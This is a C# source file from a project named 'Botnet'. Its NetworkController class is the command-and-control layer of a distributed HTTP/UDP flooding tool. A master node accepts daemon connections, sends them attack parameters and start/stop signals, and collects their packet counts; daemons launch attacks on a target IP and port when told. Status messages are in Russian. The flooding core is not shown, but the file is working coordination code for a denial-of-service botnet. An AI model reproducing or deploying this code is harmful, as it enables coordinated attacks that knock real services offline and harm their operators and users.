using System;

namespace Botnet
{
    sealed public class NetworkController
    {
        //on quit messages
        public bool mode { get; private set; }
        sealed private class Daemon
        {
            public TcpClient Client;
            public ControllerState state;
            public Daemon(TcpClient handler, ControllerState curstate)
            {
                Client = handler;
                state = curstate;
            }
            public IPEndPoint RemoteIPEndPoint
            {
                get
                {
                    return (IPEndPoint)(Client.Client.RemoteEndPoint);
                }
            }
            public override string ToString()
            {
                try
                {
                    IPEndPoint point = (IPEndPoint)(Client.Client.RemoteEndPoint);
                    return point.Address + " " + point.Port; // return state + ip + port
                }
                catch (ObjectDisposedException)
                {

                    return "";
                }
            }
        }
        private volatile ControllerState state;
        public NetworkInterface Adapter { get; private set; }
        public enum ControllerState : Byte
        {
            Suspending,
            Attacking,
            Tuning,
            Error,
        }
        private enum MessageCode : byte
        {
            Params,
            StartAttack,
            StopAttack,
            StatisticMessageRequest

        }
        private class DaemonList : List<Daemon>
        {
            public int Contains(IPEndPoint TestSubject)
            {
                // if do not exists return - 1, else index of the element in the list
                /*
                 */
                for (int i = 0; i < Count; ++i)           //prhps equals using here is necessary
                {
                    if ((this[i].RemoteIPEndPoint.Address.ToString() == TestSubject.Address.ToString()) && ((this[i].RemoteIPEndPoint.Port == TestSubject.Port)))
                    {
                        return i;
                    }
                }
                return -1;
            }

        }
        //private UdpClient Messenger;
        public delegate void CallBackFunct(string Message);
        public delegate void ChangeModeCallBack(bool mode); //looks like its not needed
        public delegate void StatisticCallBack(UInt32 httpam, UInt32 udpam, UInt32 tothttp, UInt32 totudp);
        public delegate void ErrorCallBack(string message);
        private CallBackFunct UpdateData;
        private ChangeModeCallBack ChangeMode;
        private StatisticCallBack ProccessStatisticRespond;
        private ErrorCallBack ExErrorHandler;
        private DaemonList Daemons; //for master mode
        private IPEndPoint Master; //for daemon mode
        private IPEndPoint MyPoint;
        private TcpListener Server;
        private TcpClient HostClient;
        private Counter NetCounter;
        private volatile bool AttackIsAllowed;
        public IPEndPoint LocalIpEndPoint
        {
            get
            {
                return MyPoint;
            }
        }
        public IPEndPoint MasterIpEndPont
        {
            get
            {
                return Master;
            }
        }
        //private NetworkInstruments.AddressPool RestrictedPool;
        private AttackController Core;
        public AttackParams Params
        {
            get
            {
                if (Core != null)
                {
                    return Core.Params;
                }
                else return new AttackParams();
            }
        }
        public int CurrentPort { get; set; }

        public NetworkController(AttackParams Params, NetworkInterface Adapter, CallBackFunct MessageCallBack, StatisticCallBack StatRespond, ChangeModeCallBack ModeChange, ErrorCallBack LostCOnnectionHandler, int alt_port, IPEndPoint MasterPoint) //master mode only
        {
            UpdateData = MessageCallBack;
            this.ProccessStatisticRespond = StatRespond;
            this.ExErrorHandler = LostCOnnectionHandler;
            this.ChangeMode = ModeChange; //no need, delete
            Daemons = new DaemonList();
            state = ControllerState.Tuning;
            try
            {
                InitInterface(Adapter, alt_port, MasterPoint);
                InitParams(Params);
            }
            catch (Exception err)
            {
                state = ControllerState.Error;
            }

            // what if these sockets are occupied?

        }
        public bool isAttacking
        {
            get
            {
                if (state == ControllerState.Attacking)
                {
                    return true;
                }
                else return false;

            }
        }
        public void ConnectToMaster()
        {
            if (!mode)
            {
                if (state == ControllerState.Attacking) Stop();
                Close();
                AttackIsAllowed = false;
                state = ControllerState.Tuning;
                HostClient = new TcpClient(MyPoint);
                Thread ClientHandler = new Thread(new ParameterizedThreadStart(MaintaintHostConnection));
                ClientHandler.Start(HostClient);
            }
        }
        private void InitServer()
        {
            state = ControllerState.Tuning;
            Server = new TcpListener(MyPoint);
            Daemons.Clear();
            NetCounter = new Counter();
            Server.Start();
            Server.BeginAcceptTcpClient(new AsyncCallback(ClientOnTryConnect), Server);
        }
        public void InitInterface(NetworkInterface Adapter, int al_port, IPEndPoint MasterPoint)
        {
            if (state == ControllerState.Attacking)
            {
                Stop();
            }
            if ((al_port != CurrentPort) || (Adapter.Id != this.Adapter.Id) || ((MasterPoint != null) && (!MasterPoint.Equals(Master))) || ((MasterPoint == null) && (Master != null)))
            {
                Close();
                UpdateData("Инициализация клиентов");
                try
                {
                    CurrentPort = al_port;
                    MyPoint = new IPEndPoint(NetworkInstruments.getAdapterIPAddress(Adapter), CurrentPort);
                    this.Adapter = Adapter;
                    if (MasterPoint == null)
                    {
                        mode = true;
                        InitServer();
                        //ChangeMode(true);
                    }
                    else
                    {
                        Master = MasterPoint;
                        mode = false;
                        ConnectToMaster();
                    }
                }
                catch (SocketException err)
                {
                    state = ControllerState.Error;
                    if (err.SocketErrorCode == SocketError.AddressAlreadyInUse)
                    {
                        UpdateData("Выбранный порт занят");
                    }
                    if (err.ErrorCode == (int)SocketError.AddressNotAvailable)
                    {
                        UpdateData("Не найдено интерфейса с таким адресом");
                    }
                }
                catch (ObjectDisposedException) { return; }
            }

        }
        private void ClientOnTryConnect(IAsyncResult res)
        {
            try
            {
                TcpListener Server = res.AsyncState as TcpListener;  ///////1111!!!1
                TcpClient NewHost = Server.EndAcceptTcpClient(res);
                int index = Daemons.Contains((IPEndPoint)NewHost.Client.RemoteEndPoint);
                if (index == -1)
                {
                    Thread Handler = new Thread(new ParameterizedThreadStart(MaintainServerConnection));
                    Daemons.Add(new Daemon(NewHost, ControllerState.Suspending));
                    NetCounter.addDevice();
                    Handler.Start(NewHost);
                }
                Server.BeginAcceptTcpClient(new AsyncCallback(ClientOnTryConnect), Server);
            }
            catch (ObjectDisposedException)
            {
                return;
            }
        }
        private void MaintainServerConnection(Object Params)
        {
            TcpClient Connection = Params as TcpClient;
            int index = Daemons.Contains((IPEndPoint)(Connection.Client.RemoteEndPoint));
            string hostname = Daemons[index].ToString();
            UpdateData(hostname + " Присоединился");   ///index!!!
            //do we need to connect?
            NetworkStream Stream = Connection.GetStream();
            Connection.ReceiveBufferSize = 1000;
            Connection.ReceiveTimeout = 200;
            byte[] buffer = new byte[9];
            try
            {
                while (Connection.Connected)
                {
                    if (Connection.Available >= 9)
                    {
                        Stream.Read(buffer, 0, 9);
                        UInt32 Http = BitConverter.ToUInt32(buffer, 1);
                        UInt32 Udp = BitConverter.ToUInt32(buffer, 5);
                        NetCounter.addStat(index, Http, Udp);
                        ProccessStatisticRespond(Core.HttpCounter, Core.UdpCounter, Core.HttpCounter + NetCounter.getTotatHttp(), Core.UdpCounter + NetCounter.getTotalUdp());

                    }
                }
            }
            catch (ObjectDisposedException)
            {

                return;
            } //handle disposed gere too
            UpdateData(hostname + " Отсоединился");
            NetCounter.removeDevice(index);
            Daemons.RemoveAt(index);


        }
        private class Counter
        {
            private UInt32 http;
            private UInt32 udp;
            private class device
            {
                public UInt32 http;
                public UInt32 udp;
                public device(UInt32 http, UInt32 udp)
                {
                    this.http = http;
                    this.udp = udp;
                }
            }
            List<device> devices;
            public Counter(int n)
            {
                devices = new List<device>(n);
            }
            public Counter()
            {
                devices = new List<device>();
            }
            public void addDevice()
            {
                devices.Add(new device(0, 0));
            }
            public void addStat(int ind, UInt32 http, UInt32 udp)
            {
                devices[ind].http += http;
                devices[ind].udp += udp;
                this.http += http;
                this.udp += udp;
            }
            public void removeDevice(int index)
            {
                devices.RemoveAt(index);
            }
            public UInt32 getDeviceHttp(int ind)
            {
                return devices[ind].http;
            }
            public UInt32 getDeviceUdp(int ind)
            {
                return devices[ind].udp;
            }
            public UInt32 getTotatHttp()
            {
                return http;
            }

            public UInt32 getTotalUdp()
            {
                return udp;
            }
        }
        private void MaintaintHostConnection(Object Params)
        {
            TcpClient Connection = Params as TcpClient;
            try
            {
                Connection.Connect(Master);
                if (state != ControllerState.Suspending) state = ControllerState.Suspending;
                UpdateData("Соединение с мастером установлено");
                Connection.ReceiveBufferSize = 10000;
                Connection.ReceiveTimeout = 100;
                NetworkStream Stream = Connection.GetStream();
                bool DataCollected;
                UInt32 oldHttpCount = 0;
                UInt32 oldUdpCount = 0;
                UInt32 newHttpCount;
                UInt32 newUdpCount;
                while (Connection.Connected)
                {
                    DataCollected = false;
                    if (Connection.Available >= 1)
                    {
                        int code = Stream.ReadByte();
                        switch (code)
                        {
                            case 0:
                                while (Connection.Connected && !DataCollected)
                                {
                                    if (Connection.Available >= 2)
                                    {
                                        byte[] buuf = new byte[2];
                                        Stream.Read(buuf, 0, 2);                              //df to add length in sendservicemsg
                                        UInt16 len = BitConverter.ToUInt16(buuf, 0);
                                        while (Connection.Connected && !DataCollected)
                                        {
                                            if (Connection.Available >= len)
                                            {
                                                byte[] buffer = new byte[len];
                                                Stream.Read(buffer, 0, len);
                                                InitParams(AttackParams.parseFromArray(buffer));
                                                state = ControllerState.Suspending;
                                                DataCollected = true;
                                                UpdateData("Получены настройки от мастера");
                                            }
                                        }

                                    }
                                }

                                break;
                            case 1:
                                AttackIsAllowed = true;
                                Start(); break;
                            case 2:
                                AttackIsAllowed = false;
                                Stop(); break;
                            case 3:
                                List<byte> msgs = new List<byte>();
                                msgs.Add(3);
                                newHttpCount = Core.HttpCounter;
                                newUdpCount = Core.UdpCounter;
                                msgs.AddRange(BitConverter.GetBytes(newHttpCount - oldHttpCount));
                                msgs.AddRange(BitConverter.GetBytes(newUdpCount - oldUdpCount));
                                oldHttpCount = newHttpCount;
                                oldUdpCount = newUdpCount;
                                Stream.Write(msgs.ToArray(), 0, msgs.Count);
                                //stats
                                break;
                        }
                    }
                }
                UpdateData("Соединение с мастером разорвано");
            }
            catch (SocketException err)
            {
                UpdateData("Невозможно подключиться к мастеру"); //1060 exception
                state = ControllerState.Error;

            }
            catch (ObjectDisposedException)
            {
                return;
            }


        }
        public void InitParams(AttackParams Params) // change that crap to point!!
        {
            if (state != ControllerState.Error)
            {
                UpdateData("Применение параметров");
                if (state == ControllerState.Attacking)
                {
                    Stop();
                }
                state = ControllerState.Tuning;
                if (Core != null)
                {
                    Core.Params = Params;
                    Core.Adapter = Adapter;
                    Core.ResetCounters();
                }
                else
                    Core = new AttackController(Params, Adapter, CoreErrorHandler);
                if (mode)
                {
                    state = ControllerState.Suspending;
                }
            }
        }

        /*
         messages codes: 
         0 - start attack
         1 - stop attack
         2 - tuning request 
         3 - tuning info //with payload
         4 - master off request
         5 - master echo request
         6 - daemon echo request
         7 - master echo answer
         8 - daemon echo answer
         9 - idle request (to master from daemon when machine is quiting attack)
        10 - statistic messages request
           11 - statistic messages answer with payload
           12 - ready for attack ack
           13 - master idle request
         */
        private void SendStartSignal()
        {
            for (int i = 0; i < Daemons.Count; ++i)
            {
                if (Daemons[i].state == ControllerState.Suspending)
                {
                    Daemons[i].state = ControllerState.Attacking;
                    SendServiceMessage(MessageCode.Params, Daemons[i].Client, Params.GetBytes());
                    SendServiceMessage(MessageCode.StartAttack, Daemons[i].Client);

                }
            }
        }
        private void SendStopSignal()
        {
            for (int i = 0; i < Daemons.Count; ++i)
            {
                if (Daemons[i].state == ControllerState.Attacking)
                {
                    Daemons[i].state = ControllerState.Suspending;
                    SendServiceMessage(MessageCode.StopAttack, Daemons[i].Client);

                }
            }
        }
        private void SendStatReqSignal()
        {
            for (int i = 0; i < Daemons.Count; ++i)
            {
                if (Daemons[i].state == ControllerState.Attacking)
                {
                    SendServiceMessage(MessageCode.StatisticMessageRequest, Daemons[i].Client);
                }
            }
        }
        public void Start()
        {
            if ((state != ControllerState.Error) && (state != ControllerState.Tuning))
            {
                if (!Core.State)
                {
                    if (mode)
                    {
                        SendStartSignal();
                        UpdateData("Начало атаки на " + Core.Params.Target.Address.ToString() + ":" + Core.Params.Target.Port);
                        Core.start();
                        state = ControllerState.Attacking;
                    }
                    else
                    {
                        if (AttackIsAllowed)
                        {
                            Core.start();
                            UpdateData("Начало атаки на" + Core.Params.Target.Address.ToString() + ":" + Core.Params.Target.Port);
                            state = ControllerState.Attacking;
                        }
                        else UpdateData("Атака еще не запущена мастером");
                    }

                }
                else
                {
                    UpdateData("Атака уже запущена");
                }
            }
            else
            {
                if (state == ControllerState.Error)
                {
                    if (!mode)
                    {
                        UpdateData("Отсутсвует подключение к мастеру");
                    }
                    else
                    {
                        UpdateData("выбранный порт занят");
                    }
                    //state = ControllerState.Error; 
                }
            }

        }


        public void Stop()
        {
            if (state == ControllerState.Attacking)
            {
                Core.stop();
                UpdateData("Остановка атаки...");
                if (mode)
                {
                    SendStopSignal();
                }
                state = ControllerState.Suspending;
            }
            else
            {
                UpdateData("Атака еще не запущена");
            }
        }
        private void SendServiceMessage(MessageCode code, TcpClient Recipinet, params byte[] payload)
        {
            List<byte> data = new List<byte>();
            data.Add((byte)code);
            if (payload.Length != 0)
            {
                data.AddRange(BitConverter.GetBytes((UInt16)payload.Length));
                data.AddRange(payload);
            }
            try
            {
                Recipinet.GetStream().Write(data.ToArray(), 0, data.Count);
            }
            catch (Exception)
            {  //host has disconnected
            }
        }

        private void CoreErrorHandler(int errorcode, string message)  //0 socket error, 1 - cant reach the target
        {
            if (state != ControllerState.Suspending)
            {
                Stop();
                //state = ControllerState.Error;
            }
            ExErrorHandler(message);

        }

        public void Statistic() //return amount of sent packets from each pc
        {
            //return new int[] { };
            //packetcounter = Core.Counter;
            if (mode)
            {
                if (Daemons.Count != 0)
                {
                    SendStatReqSignal();
                    //ProccessStatisticRespond(Core.HttpCounter, Core.UdpCounter, NetCounter.getTotatHttp(), NetCounter.getTotalUdp());
                }
                else
                {
                    ProccessStatisticRespond(Core.HttpCounter, Core.UdpCounter, Core.HttpCounter, Core.UdpCounter);
                }
                //hehe, what if there's no other devices?
            }
            else
            {
                ProccessStatisticRespond(Core.HttpCounter, Core.UdpCounter, 0, 0);
            }
        }
        public string[] GetDaemonList()
        {
            if (!mode) throw new Exception(); //if daemon mode its invalid cast
            string[] info = new string[Daemons.Count];
            for (int i = 0; i < info.Length; ++i)
            {
                info[i] = Daemons[i].ToString();
            }
            return info;
            // return for each daemon to array();
        }
        public void Close()
        {
            //close all connections
            if (mode)
            {
                if (Server != null)
                {
                    for (int i = 0; i < Daemons.Count; ++i)
                    {
                        if (Daemons[i].Client != null)
                        {
                            if ((Daemons[i].Client.Client != null) && (Daemons[i].Client.Connected))
                            {
                                Daemons[i].Client.GetStream().Close();
                            }
                            Daemons[i].Client.Close();
                        }
                    }
                    Server.Stop();
                }
            }
            else
            {
                if (HostClient != null)
                {
                    if ((HostClient.Client != null) && (HostClient.Connected))
                    {
                        HostClient.GetStream().Close();
                    }
                    HostClient.Close();
                }
            }
        }
    } 
}